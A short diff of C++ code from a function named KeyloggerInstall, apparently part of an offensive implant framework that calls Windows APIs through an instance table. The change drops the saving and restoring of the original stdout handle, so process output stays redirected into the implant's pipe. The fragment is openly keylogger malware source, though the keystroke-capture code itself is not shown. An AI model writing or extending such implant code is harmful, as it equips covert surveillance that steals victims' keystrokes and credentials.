@@ -7,8 +7,7 @@ auto DECLFN KeyloggerInstall(
     G_INSTANCE
 
     HRESULT          HResult     = 0;
-    HANDLE           BckpStdout  = INVALID_HANDLE_VALUE;
-    HANDLE           BackupPp  = INVALID_HANDLE_VALUE;
+
     auto KeyloggerCleanup = [&]() {
         return HResult;
     };
@@ -36,7 +35,6 @@ auto DECLFN KeyloggerInstall(
             return KeyloggerCleanup();
         }
 
-        BackupPp = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
         Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
     }
 
@@ -95,7 +93,6 @@ auto DECLFN KeyloggerInstall(
         }
 
         Instance->Win32.FlushFileBuffers( Instance->Pipe.Write );
-        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, BackupPp );
     }
 
     return KeyloggerCleanup();
